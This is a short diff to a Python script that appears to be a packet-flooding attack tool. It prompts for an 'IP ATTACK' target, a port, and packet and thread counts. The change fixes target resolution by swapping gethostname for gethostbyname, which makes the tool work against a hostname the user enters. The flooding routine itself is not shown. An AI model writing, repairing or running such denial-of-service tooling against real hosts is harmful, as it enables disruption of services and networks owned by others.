@@ -326,7 +326,7 @@ def kok():
     print("VĪP DÉTÉÇT")
 kok()
 ip = str(input("IP ATTACK>="))
-ip = socket.gethostname(ip)
+ip = socket.gethostbyname(ip)
 port = int(input("PORT >= "))
 pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
